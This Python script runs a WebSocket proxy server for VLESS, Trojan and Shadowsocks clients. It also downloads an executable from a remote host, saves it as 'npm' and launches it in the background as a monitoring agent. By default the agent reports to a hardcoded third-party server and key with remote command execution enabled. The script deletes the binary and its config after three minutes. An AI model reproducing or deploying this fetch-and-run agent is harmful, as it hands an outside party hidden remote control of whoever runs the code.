#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import struct
import hashlib
import base64
import asyncio
import aiohttp
import logging
import ipaddress
import subprocess
from aiohttp import web

# ==================== 环境变量 ====================
UUID = os.environ.get('UUID', '1d383fe5-7f14-4881-a738-7da92214fe81')
NEZHA_SERVER = os.environ.get('NEZHA_SERVER', 'nz.lilyonlyone.eu.org')
NEZHA_PORT = os.environ.get('NEZHA_PORT', '443')
NEZHA_KEY = os.environ.get('NEZHA_KEY', '80lwzKSHxSL9mMgBbL')
DOMAIN = os.environ.get('DOMAIN', '')
SUB_PATH = os.environ.get('SUB_PATH', 'sub')
NAME = os.environ.get('NAME', '')
WSPATH = os.environ.get('WSPATH', UUID[:8])
PORT = int(os.environ.get('SERVER_PORT') or os.environ.get('PORT') or 8080)  # 默认改成 8080
AUTO_ACCESS = os.environ.get('AUTO_ACCESS', '').lower() == 'true'
DEBUG = os.environ.get('DEBUG', '').lower() == 'true'

CurrentDomain = DOMAIN
CurrentPort = 443
Tls = 'tls'
ISP = ''

DNS_SERVERS = ['8.8.4.4', '1.1.1.1']
BLOCKED_DOMAINS = [
    'speedtest.net', 'fast.com', 'speedtest.cn', 'speed.cloudflare.com', 'speedof.me',
    'testmy.net', 'bandwidth.place', 'speed.io', 'librespeed.org', 'speedcheck.org'
]

log_level = logging.DEBUG if DEBUG else logging.INFO
logging.basicConfig(level=log_level, format='%(asctime)s - %(levelname)s - %(message)s')
for name in ['aiohttp.access', 'aiohttp.server', 'aiohttp.client', 'aiohttp.internal', 'aiohttp.websocket']:
    logging.getLogger(name).setLevel(logging.WARNING)
logger = logging.getLogger(__name__)


def is_blocked_domain(host: str) -> bool:
    if not host:
        return False
    host_lower = host.lower()
    return any(host_lower == blocked or host_lower.endswith('.' + blocked) for blocked in BLOCKED_DOMAINS)


async def get_isp():
    global ISP
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get('https://api.ip.sb/geoip', headers={'User-Agent': 'Mozilla/5.0'}, timeout=3) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    ISP = f"{data.get('country_code', '')}-{data.get('isp', '')}".replace(' ', '_')
                    return
    except:
        pass
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get('http://ip-api.com/json', headers={'User-Agent': 'Mozilla/5.0'}, timeout=3) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    ISP = f"{data.get('countryCode', '')}-{data.get('org', '')}".replace(' ', '_')
                    return
    except:
        pass
    ISP = 'Unknown'


async def get_ip():
    global CurrentDomain, Tls, CurrentPort
    if not DOMAIN or DOMAIN == 'your-domain.com':
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get('https://api-ipv4.ip.sb/ip', timeout=5) as resp:
                    if resp.status == 200:
                        ip = await resp.text()
                        CurrentDomain = ip.strip()
                        Tls = 'none'
                        CurrentPort = PORT
        except Exception as e:
            logger.error(f'Failed to get IP: {e}')
            CurrentDomain = 'change-your-domain.com'
            Tls = 'tls'
            CurrentPort = 443
    else:
        CurrentDomain = DOMAIN
        Tls = 'tls'
        CurrentPort = 443


async def resolve_host(host: str) -> str:
    try:
        ipaddress.ip_address(host)
        return host
    except:
        pass
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(f'https://dns.google/resolve?name={host}&type=A', timeout=5) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    if data.get('Status') == 0 and data.get('Answer'):
                        for answer in data['Answer']:
                            if answer.get('type') == 1:
                                return answer.get('data')
    except:
        pass
    return host


class ProxyHandler:
    def __init__(self, uuid: str):
        self.uuid = uuid
        self.uuid_bytes = bytes.fromhex(uuid)

    async def handle_vless(self, websocket, first_msg: bytes) -> bool:
        try:
            if len(first_msg) < 18 or first_msg[0] != 0:
                return False
            if first_msg[1:17] != self.uuid_bytes:
                return False
            i = first_msg[17] + 19
            if i + 3 > len(first_msg):
                return False
            port = struct.unpack('!H', first_msg[i:i+2])[0]
            i += 2
            atyp = first_msg[i]
            i += 1
            host = ''
            if atyp == 1:
                if i + 4 > len(first_msg): return False
                host = '.'.join(str(b) for b in first_msg[i:i+4])
                i += 4
            elif atyp == 2:
                if i >= len(first_msg): return False
                host_len = first_msg[i]
                i += 1
                if i + host_len > len(first_msg): return False
                host = first_msg[i:i+host_len].decode()
                i += host_len
            elif atyp == 3:
                if i + 16 > len(first_msg): return False
                host = ':'.join(f'{(first_msg[j] << 8) + first_msg[j+1]:04x}' for j in range(i, i+16, 2))
                i += 16
            else:
                return False
            if is_blocked_domain(host):
                await websocket.close()
                return False
            await websocket.send_bytes(bytes([0, 0]))
            resolved_host = await resolve_host(host)
            try:
                reader, writer = await asyncio.open_connection(resolved_host, port)
                if i < len(first_msg):
                    writer.write(first_msg[i:])
                    await writer.drain()
                async def forward_ws_to_tcp():
                    try:
                        async for msg in websocket:
                            if msg.type == aiohttp.WSMsgType.BINARY:
                                writer.write(msg.data)
                                await writer.drain()
                    except: pass
                    finally:
                        writer.close()
                        await writer.wait_closed()
                async def forward_tcp_to_ws():
                    try:
                        while True:
                            data = await reader.read(4096)
                            if not data: break
                            await websocket.send_bytes(data)
                    except: pass
                await asyncio.gather(forward_ws_to_tcp(), forward_tcp_to_ws())
            except Exception as e:
                if DEBUG: logger.error(f"Connection error: {e}")
            return True
        except Exception as e:
            if DEBUG: logger.error(f"VLESS handler error: {e}")
            return False

    async def handle_trojan(self, websocket, first_msg: bytes) -> bool:
        try:
            if len(first_msg) < 58: return False
            received_hash_bytes = first_msg[:56]
            hash_obj1 = hashlib.sha224()
            hash_obj1.update(self.uuid.encode())
            expected_hash_hex1 = hash_obj1.hexdigest()
            hash_obj2 = hashlib.sha224()
            hash_obj2.update(UUID.encode())
            expected_hash_hex2 = hash_obj2.hexdigest()
            received_hash_hex = received_hash_bytes.decode('ascii', errors='ignore')
            if received_hash_hex != expected_hash_hex1 and received_hash_hex != expected_hash_hex2:
                return False
            offset = 56
            if first_msg[offset:offset+2] == b'\r\n': offset += 2
            if first_msg[offset] != 1: return False
            offset += 1
            atyp = first_msg[offset]
            offset += 1
            host = ''
            if atyp == 1:
                host = '.'.join(str(b) for b in first_msg[offset:offset+4])
                offset += 4
            elif atyp == 3:
                host_len = first_msg[offset]
                offset += 1
                host = first_msg[offset:offset+host_len].decode()
                offset += host_len
            elif atyp == 4:
                host = ':'.join(f'{(first_msg[j] << 8) + first_msg[j+1]:04x}' for j in range(offset, offset+16, 2))
                offset += 16
            else:
                return False
            port = struct.unpack('!H', first_msg[offset:offset+2])[0]
            offset += 2
            if first_msg[offset:offset+2] == b'\r\n': offset += 2
            if is_blocked_domain(host):
                await websocket.close()
                return False
            resolved_host = await resolve_host(host)
            try:
                reader, writer = await asyncio.open_connection(resolved_host, port)
                if offset < len(first_msg):
                    writer.write(first_msg[offset:])
                    await writer.drain()
                async def forward_ws_to_tcp():
                    try:
                        async for msg in websocket:
                            if msg.type == aiohttp.WSMsgType.BINARY:
                                writer.write(msg.data)
                                await writer.drain()
                    except: pass
                    finally:
                        writer.close()
                        await writer.wait_closed()
                async def forward_tcp_to_ws():
                    try:
                        while True:
                            data = await reader.read(4096)
                            if not data: break
                            await websocket.send_bytes(data)
                    except: pass
                await asyncio.gather(forward_ws_to_tcp(), forward_tcp_to_ws())
            except Exception as e:
                if DEBUG: logger.error(f"Connection error: {e}")
            return True
        except Exception as e:
            if DEBUG: logger.error(f"Tro handler error: {e}")
            return False

    async def handle_shadowsocks(self, websocket, first_msg: bytes) -> bool:
        try:
            if len(first_msg) < 7: return False
            offset = 0
            atyp = first_msg[offset]
            offset += 1
            host = ''
            if atyp == 1:
                if offset + 4 > len(first_msg): return False
                host = '.'.join(str(b) for b in first_msg[offset:offset+4])
                offset += 4
            elif atyp == 3:
                if offset >= len(first_msg): return False
                host_len = first_msg[offset]
                offset += 1
                if offset + host_len > len(first_msg): return False
                host = first_msg[offset:offset+host_len].decode()
                offset += host_len
            elif atyp == 4:
                if offset + 16 > len(first_msg): return False
                host = ':'.join(f'{(first_msg[j] << 8) + first_msg[j+1]:04x}' for j in range(offset, offset+16, 2))
                offset += 16
            else:
                return False
            if offset + 2 > len(first_msg): return False
            port = struct.unpack('!H', first_msg[offset:offset+2])[0]
            offset += 2
            if is_blocked_domain(host):
                await websocket.close()
                return False
            resolved_host = await resolve_host(host)
            try:
                reader, writer = await asyncio.open_connection(resolved_host, port)
                if offset < len(first_msg):
                    writer.write(first_msg[offset:])
                    await writer.drain()
                async def forward_ws_to_tcp():
                    try:
                        async for msg in websocket:
                            if msg.type == aiohttp.WSMsgType.BINARY:
                                writer.write(msg.data)
                                await writer.drain()
                    except: pass
                    finally:
                        writer.close()
                        await writer.wait_closed()
                async def forward_tcp_to_ws():
                    try:
                        while True:
                            data = await reader.read(4096)
                            if not data: break
                            await websocket.send_bytes(data)
                    except: pass
                await asyncio.gather(forward_ws_to_tcp(), forward_tcp_to_ws())
            except Exception as e:
                if DEBUG: logger.error(f"Connection error: {e}")
            return True
        except Exception as e:
            if DEBUG: logger.error(f"Shadowsocks handler error: {e}")
            return False


async def websocket_handler(request):
    ws = web.WebSocketResponse()
    await ws.prepare(request)
    CUUID = UUID.replace('-', '')
    path = request.path
    if f'/{WSPATH}' not in path:
        await ws.close()
        return ws
    proxy = ProxyHandler(CUUID)
    try:
        first_msg = await asyncio.wait_for(ws.receive(), timeout=5)
        if first_msg.type != aiohttp.WSMsgType.BINARY:
            await ws.close()
            return ws
        msg_data = first_msg.data
        if len(msg_data) > 17 and msg_data[0] == 0:
            if await proxy.handle_vless(ws, msg_data):
                return ws
        if len(msg_data) >= 58:
            if await proxy.handle_trojan(ws, msg_data):
                return ws
        if len(msg_data) > 0 and msg_data[0] in (1, 3, 4):
            if await proxy.handle_shadowsocks(ws, msg_data):
                return ws
        await ws.close()
    except:
        await ws.close()
    return ws


async def http_handler(request):
    if request.path == '/':
        try:
            with open('index.html', 'r', encoding='utf-8') as f:
                return web.Response(text=f.read(), content_type='text/html')
        except:
            return web.Response(text='Hello world!', content_type='text/html')
    elif request.path == f'/{SUB_PATH}':
        await get_isp()
        await get_ip()
        name_part = f"{NAME}-{ISP}" if NAME else ISP
        tls_param = 'tls' if Tls == 'tls' else 'none'
        ss_tls_param = 'tls;' if Tls == 'tls' else ''
        vless_url = f"vless://{UUID}@{CurrentDomain}:{CurrentPort}?encryption=none&security={tls_param}&sni={CurrentDomain}&fp=chrome&type=ws&host={CurrentDomain}&path=%2F{WSPATH}#{name_part}"
        trojan_url = f"trojan://{UUID}@{CurrentDomain}:{CurrentPort}?security={tls_param}&sni={CurrentDomain}&fp=chrome&type=ws&host={CurrentDomain}&path=%2F{WSPATH}#{name_part}"
        ss_method_password = base64.b64encode(f"none:{UUID}".encode()).decode()
        ss_url = f"ss://{ss_method_password}@{CurrentDomain}:{CurrentPort}?plugin=v2ray-plugin;mode%3Dwebsocket;host%3D{CurrentDomain};path%3D%2F{WSPATH};{ss_tls_param}sni%3D{CurrentDomain};skip-cert-verify%3Dtrue;mux%3D0#{name_part}"
        subscription = f"{vless_url}\n{trojan_url}\n{ss_url}"
        return web.Response(text=base64.b64encode(subscription.encode()).decode() + '\n', content_type='text/plain')
    return web.Response(status=404, text='Not Found\n')


def get_download_url():
    import platform
    arch = platform.machine().lower()
    if 'arm' in arch or 'aarch64' in arch:
        return 'https://arm64.eooce.com/v1' if not NEZHA_PORT else 'https://arm64.eooce.com/agent'
    return 'https://amd64.eooce.com/v1' if not NEZHA_PORT else 'https://amd64.eooce.com/agent'


async def download_file():
    if not NEZHA_SERVER and not NEZHA_KEY:
        return
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(get_download_url()) as resp:
                if resp.status == 200:
                    with open('npm', 'wb') as f:
                        f.write(await resp.read())
                    os.chmod('npm', 0o755)
                    logger.info('✅ npm downloaded successfully')
    except Exception as e:
        logger.error(f'Download failed: {e}')


async def run_nezha():
    try:
        result = subprocess.run(['ps', 'aux'], capture_output=True, text=True)
        if './npm' in result.stdout:
            return
    except:
        pass
    await download_file()
    if not (NEZHA_SERVER and NEZHA_KEY):
        return
    tls_ports = ['443', '8443', '2096', '2087', '2083', '2053']
    try:
        if NEZHA_PORT:
            nezha_tls = '--tls' if NEZHA_PORT in tls_ports else ''
            cmd = f'nohup ./npm -s {NEZHA_SERVER}:{NEZHA_PORT} -p {NEZHA_KEY} {nezha_tls} --disable-auto-update --report-delay 4 --skip-conn --skip-procs >/dev/null 2>&1 &'
        else:
            port = NEZHA_SERVER.split(':')[-1] if ':' in NEZHA_SERVER else ''
            nz_tls = 'true' if port in tls_ports else 'false'
            config = f"""client_secret: {NEZHA_KEY}
debug: false
disable_auto_update: true
disable_command_execute: false
disable_force_update: true
disable_nat: false
disable_send_query: false
gpu: false
insecure_tls: true
ip_report_period: 1800
report_delay: 4
server: {NEZHA_SERVER}
skip_connection_count: true
skip_procs_count: true
temperature: false
tls: {nz_tls}
use_gitee_to_upgrade: false
use_ipv6_country_code: false
uuid: {UUID}"""
            with open('config.yaml', 'w') as f:
                f.write(config)
            cmd = 'nohup ./npm -c config.yaml >/dev/null 2>&1 &'
        subprocess.Popen(cmd, shell=True, executable='/bin/bash')
        logger.info('✅ nz started successfully')
    except Exception as e:
        logger.error(f'Error running nz: {e}')


async def add_access_task():
    if not AUTO_ACCESS or not DOMAIN:
        return
    try:
        async with aiohttp.ClientSession() as session:
            await session.post("https://oooo.serv00.net/add-url",
                               json={"url": f"https://{DOMAIN}/{SUB_PATH}"},
                               headers={'Content-Type': 'application/json'})
        logger.info('Automatic Access Task added successfully')
    except:
        pass


def cleanup_files():
    for f in ['npm', 'config.yaml']:
        try:
            if os.path.exists(f):
                os.remove(f)
        except:
            pass


async def main():
    logger.info(f"Starting server on 0.0.0.0:{PORT}")
    app = web.Application()
    app.router.add_get('/', http_handler)
    app.router.add_get(f'/{SUB_PATH}', http_handler)
    app.router.add_get(f'/{WSPATH}', websocket_handler)

    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', PORT)
    await site.start()
    logger.info(f"✅ server is running on port {PORT}")

    asyncio.create_task(run_nezha())
    asyncio.create_task(asyncio.sleep(180)).add_done_callback(lambda _: cleanup_files())
    await add_access_task()

    await asyncio.Future()  # 永远运行


if __name__ == '__main__':
    try:
        asyncio.run(main())
    except Exception as e:
        logger.error(f"启动失败: {e}")
        sys.exit(1)
